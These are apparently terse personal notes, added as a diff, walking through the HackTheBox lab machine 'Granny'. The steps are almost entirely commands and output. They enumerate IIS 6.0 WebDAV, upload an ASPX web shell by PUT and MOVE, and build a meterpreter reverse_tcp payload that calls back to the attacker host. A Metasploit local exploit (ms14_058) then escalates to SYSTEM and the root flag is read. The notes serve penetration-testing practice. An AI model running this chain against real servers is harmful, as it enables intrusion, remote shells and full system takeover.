@@ -1,0 +1,312 @@
+let's enumerate first.
+command: sudo rustscan -a 10.10.10.15
+result:
+PORT   STATE SERVICE REASON
+80/tcp open  http    syn-ack ttl 127
+
+command: sudo nmap -sSVC -A -p 80 10.10.10.15
+result:
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Microsoft IIS httpd 6.0
+| http-methods: 
+|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
+| http-webdav-scan: 
+|   Server Type: Microsoft-IIS/6.0
+|   WebDAV type: Unknown
+|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
+|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
+|_  Server Date: Sun, 09 Jul 2023 17:30:40 GMT
+|_http-server-header: Microsoft-IIS/6.0
+|_http-title: Under Construction
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose|media device
+Running (JUST GUESSING): Microsoft Windows 2000|XP|2003|PocketPC/CE (93%), BT embedded (85%)
+OS CPE: cpe:/o:microsoft:windows_2000::sp4 cpe:/o:microsoft:windows_xp::sp1:professional cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_ce:5.0.1400 cpe:/h:btvision:btvision%2b_box
+Aggressive OS guesses: Microsoft Windows 2000 SP4 or Windows XP Professional SP1 (93%), Microsoft Windows Server 2003 SP1 (93%), Microsoft Windows Server 2003 SP1 or SP2 (93%), Microsoft Windows Server 2003 SP2 (93%), Microsoft Windows 2003 SP2 (92%), Microsoft Windows 2000 SP3/SP4 or Windows XP SP1/SP2 (90%), Microsoft Windows 2000 SP4 (90%), Microsoft Windows XP SP2 or SP3 (90%), Microsoft Windows XP SP3 (90%), Microsoft Windows 2000 SP1 (90%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+access: http://10.10.10.15/
+GET / HTTP/1.1
+Host: 10.10.10.15
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+If-None-Match: "05b3daec0d9c21:390"
+If-Modified-Since: Fri, 21 Feb 2003 15:48:30 GMT
+Connection: close
+
+command: gobuster dir -u http://10.10.10.15 -w /snap/seclists/34/Discovery/Web-Content/directory-list-2.3-small.txt -t 50 -x aspx,txt,html
+result:
+/images               (Status: 301) [Size: 149] [--> http://10.10.10.15/images/]
+/Images               (Status: 301) [Size: 149] [--> http://10.10.10.15/Images/]
+/IMAGES               (Status: 301) [Size: 149] [--> http://10.10.10.15/IMAGES/]
+/df.txt               (Status: 200) [Size: 4]
+/*checkout*.aspx      (Status: 400) [Size: 37]
+/met.aspx             (Status: 200) [Size: 0]
+/*docroot*.aspx       (Status: 400) [Size: 37]
+/DF.txt               (Status: 200) [Size: 4]
+/*.aspx               (Status: 400) [Size: 37]
+/http%3A%2F%2Fwww.aspx (Status: 400) [Size: 37]
+/%7Emike.aspx         (Status: 500) [Size: 3026]
+/q%26a.aspx           (Status: 400) [Size: 37]
+/http%3A.aspx         (Status: 400) [Size: 37]
+/**http%3a.aspx       (Status: 400) [Size: 37]
+/%7Ejeff.aspx         (Status: 500) [Size: 3026]
+/*http%3A.aspx        (Status: 400) [Size: 37]
+/%7Elinda.aspx        (Status: 500) [Size: 3026]
+/_private             (Status: 301) [Size: 153] [--> http://10.10.10.15/%5Fprivate/]
+/**http%3A.aspx       (Status: 400) [Size: 37]
+/%7E3.aspx            (Status: 500) [Size: 3026]
+/%7Er.aspx            (Status: 500) [Size: 3026]
+/http%3A%2F%2Fyoutube.aspx (Status: 400) [Size: 37]
+/http%3A%2F%2Fblogs.aspx (Status: 400) [Size: 37]
+/http%3A%2F%2Fblog.aspx (Status: 400) [Size: 37]
+/MET.aspx             (Status: 200) [Size: 0]
+/**http%3A%2F%2Fwww.aspx (Status: 400) [Size: 37]
+/%7Eprovos.aspx       (Status: 500) [Size: 3026]
+/%7Ets.aspx           (Status: 500) [Size: 3026]
+/%7Echris.aspx        (Status: 500) [Size: 3026]
+/%7Ecook.aspx         (Status: 500) [Size: 3026]
+/%7Egreg.aspx         (Status: 500) [Size: 3026]
+/%7Eesr.aspx          (Status: 500) [Size: 3026]
+/%7Emasmith.aspx      (Status: 500) [Size: 3026]
+/%7Erachna.aspx       (Status: 500) [Size: 3026]
+/%7Ecbedon.aspx       (Status: 500) [Size: 3026]
+/%7Eiramani.aspx      (Status: 500) [Size: 3026]
+/%7Ewu.aspx           (Status: 500) [Size: 3026]
+/%7Ehchen.aspx        (Status: 500) [Size: 3026]
+/%7Edugsong.aspx      (Status: 500) [Size: 3026]
+Progress: 350622 / 350660 (99.99%)
+
+command: ./davtest.pl -url http://10.10.10.15
+result:
+********************************************************
+ Testing DAV connection
+OPEN		SUCCEED:		http://10.10.10.15
+********************************************************
+NOTE	Random string for this session: TJGdoGy
+********************************************************
+ Creating directory
+MKCOL		SUCCEED:		Created http://10.10.10.15/DavTestDir_TJGdoGy
+********************************************************
+ Sending test files
+PUT	jhtml	SUCCEED:	http://10.10.10.15/DavTestDir_TJGdoGy/davtest_TJGdoGy.jhtml
+PUT	html	SUCCEED:	http://10.10.10.15/DavTestDir_TJGdoGy/davtest_TJGdoGy.html
+PUT	jsp	SUCCEED:	http://10.10.10.15/DavTestDir_TJGdoGy/davtest_TJGdoGy.jsp
+PUT	cgi	FAIL
+PUT	aspx	FAIL
+PUT	shtml	FAIL
+PUT	asp	FAIL
+PUT	php	SUCCEED:	http://10.10.10.15/DavTestDir_TJGdoGy/davtest_TJGdoGy.php
+PUT	txt	SUCCEED:	http://10.10.10.15/DavTestDir_TJGdoGy/davtest_TJGdoGy.txt
+PUT	cfm	SUCCEED:	http://10.10.10.15/DavTestDir_TJGdoGy/davtest_TJGdoGy.cfm
+PUT	pl	SUCCEED:	http://10.10.10.15/DavTestDir_TJGdoGy/davtest_TJGdoGy.pl
+********************************************************
+ Checking for test file execution
+EXEC	jhtml	FAIL
+EXEC	html	SUCCEED:	http://10.10.10.15/DavTestDir_TJGdoGy/davtest_TJGdoGy.html
+EXEC	html	FAIL
+EXEC	jsp	FAIL
+EXEC	php	FAIL
+EXEC	txt	SUCCEED:	http://10.10.10.15/DavTestDir_TJGdoGy/davtest_TJGdoGy.txt
+EXEC	txt	FAIL
+EXEC	cfm	FAIL
+EXEC	pl	FAIL
+
+********************************************************
+./davtest.pl Summary:
+Created: http://10.10.10.15/DavTestDir_TJGdoGy
+PUT File: http://10.10.10.15/DavTestDir_TJGdoGy/davtest_TJGdoGy.jhtml
+PUT File: http://10.10.10.15/DavTestDir_TJGdoGy/davtest_TJGdoGy.html
+PUT File: http://10.10.10.15/DavTestDir_TJGdoGy/davtest_TJGdoGy.jsp
+PUT File: http://10.10.10.15/DavTestDir_TJGdoGy/davtest_TJGdoGy.php
+PUT File: http://10.10.10.15/DavTestDir_TJGdoGy/davtest_TJGdoGy.txt
+PUT File: http://10.10.10.15/DavTestDir_TJGdoGy/davtest_TJGdoGy.cfm
+PUT File: http://10.10.10.15/DavTestDir_TJGdoGy/davtest_TJGdoGy.pl
+Executes: http://10.10.10.15/DavTestDir_TJGdoGy/davtest_TJGdoGy.html
+Executes: http://10.10.10.15/DavTestDir_TJGdoGy/davtest_TJGdoGy.txt
+
+command: echo 0xdf > test.txt
+command: curl -X PUT http://10.10.10.15/df.txt -d @test.txt
+command: curl http://10.10.10.15/df.txt 
+0xdf
+
+command: curl -X PUT http://10.10.10.15/df.aspx -d @test.txt
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<HTML><HEAD><TITLE>The page cannot be displayed</TITLE>
+<META HTTP-EQUIV="Content-Type" Content="text/html; charset=Windows-1252">
+<STYLE type="text/css">
+  BODY { font: 8pt/12pt verdana }
+  H1 { font: 13pt/15pt verdana }
+  H2 { font: 8pt/12pt verdana }
+  A:link { color: red }
+  A:visited { color: maroon }
+</STYLE>
+</HEAD><BODY><TABLE width=500 border=0 cellspacing=10><TR><TD>
+
+<h1>The page cannot be displayed</h1>
+You have attempted to execute a CGI, ISAPI, or other executable program from a directory that does not allow programs to be executed.
+<hr>
+<p>Please try the following:</p>
+<ul>
+<li>Contact the Web site administrator if you believe this directory should allow execute access.</li>
+</ul>
+<h2>HTTP Error 403.1 - Forbidden: Execute access is denied.<br>Internet Information Services (IIS)</h2>
+<hr>
+<p>Technical Information (for support personnel)</p>
+<ul>
+<li>Go to <a href="http://go.microsoft.com/fwlink/?linkid=8180">Microsoft Product Support Services</a> and perform a title search for the words <b>HTTP</b> and <b>403</b>.</li>
+<li>Open <b>IIS Help</b>, which is accessible in IIS Manager (inetmgr),
+ and search for topics titled <b>Configuring ISAPI Extensions</b>, <b>Configuring CGI Applications</b>, <b>Securing Your Site with Web Site Permissions</b>, and <b>About Custom Error Messages</b>.</li>
+<li>In the IIS Software Development Kit (SDK) or at the <a href="http://go.microsoft.com/fwlink/?LinkId=8181">MSDN Online Library</a>, search for topics titled <b>Developing ISAPI Extensions</b>, <b>ISAPI and CGI</b>, and <b>Debugging ISAPI Extensions and Filters</b>.</li>
+</ul>
+
+</TD></TR></TABLE></BODY></HTML>
+
+command: curl -X PUT http://10.10.10.15/0xdf.txt -d @cmdasp.aspx
+access: http://10.10.10.15/0xdf.txt
+
+command: curl -X MOVE -H 'Destination:http://10.10.10.15/0xdf.aspx' http://10.10.10.15/0xdf.txt
+access: http://10.10.10.15/0xdf.aspx
+
+input: whoami
+result:
+nt authority\network service
+
+command: msfvenom -p windows/meterpreter/reverse_tcp LHOSt=10.10.16.19 LPORT=7979 -f aspx > met.aspx
+msf6 exploit(multi/handler) > options
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.10.16.19      yes       The listen address (an interface may be specified)
+   LPORT     7979             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+command: curl -X PUT http://10.10.10.15/met.txt --data-binary @met.aspx 
+command: curl -X MOVE -H 'Destination: http://10.10.10.15/met.aspx' http://10.10.10.15/met.txt
+
+msf6 exploit(multi/handler) > run
+access: http://10.10.10.15/met.aspx
+
+meterpreter > background
+[*] Backgrounding session 1...
+msf6 exploit(multi/handler) > search local_exploit
+
+Matching Modules
+================
+
+   #  Name                                      Disclosure Date  Rank    Check  Description
+   -  ----                                      ---------------  ----    -----  -----------
+   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester
+
+
+Interact with a module by name or index. For example info 0, use 0 or use post/multi/recon/local_exploit_suggester
+
+msf6 exploit(multi/handler) > use 0
+msf6 post(multi/recon/local_exploit_suggester) > set session 1
+session => 1
+msf6 post(multi/recon/local_exploit_suggester) > run
+
+[*] 10.10.10.15 - Collecting local exploits for x86/windows...
+[*] 10.10.10.15 - 185 exploit checks are being tried...
+[+] 10.10.10.15 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
+[+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
+[+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
+[+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+[+] 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
+[+] 10.10.10.15 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
+[+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
+[*] Running check method for exploit 41 / 41
+[*] 10.10.10.15 - Valid modules for session 1:
+
+ #   Name                                                           Potentially Vulnerable?  Check Result
+ -   ----                                                           -----------------------  ------------
+ 1   exploit/windows/local/ms10_015_kitrap0d                        Yes                      The service is running, but could not be validated.
+ 2   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
+ 3   exploit/windows/local/ms14_070_tcpip_ioctl                     Yes                      The target appears to be vulnerable.
+ 4   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
+ 5   exploit/windows/local/ms16_016_webdav                          Yes                      The service is running, but could not be validated.
+ 6   exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.
+ 7   exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.
+
+
+look promising:
+ 2   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
+
+msf6 exploit(windows/local/ms14_058_track_popup_menu) > options
+
+Module options (exploit/windows/local/ms14_058_track_popup_menu):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION  1                yes       The session to run this module on
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.10.16.19      yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows x86
+
+View the full module info with the info, or info -d command.
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(windows/local/ms14_058_track_popup_menu) > run
+
+[*] Started reverse TCP handler on 10.10.16.19:4444 
+[*] Reflectively injecting the exploit DLL and triggering the exploit...
+[*] Launching msiexec to host the DLL...
+[+] Process 2848 launched.
+[*] Reflectively injecting the DLL into 2848...
+[*] Sending stage (175686 bytes) to 10.10.10.15
+[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
+[*] Meterpreter session 2 opened (10.10.16.19:4444 -> 10.10.10.15:1035) at 2023-07-10 01:18:49 +0700
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+
+meterpreter > shell
+Process 936 created.
+Channel 1 created.
+Microsoft Windows [Version 5.2.3790]
+(C) Copyright 1985-2003 Microsoft Corp.
+
+c:\windows\system32\inetsrv>
+
+C:\Documents and Settings\Administrator\Desktop>type root.txt
+type root.txt
+aa4beed1c0584445ab463a6747bd06e9
+
+
+resource:
+https://0xdf.gitlab.io/2019/03/06/htb-granny.html#box-info
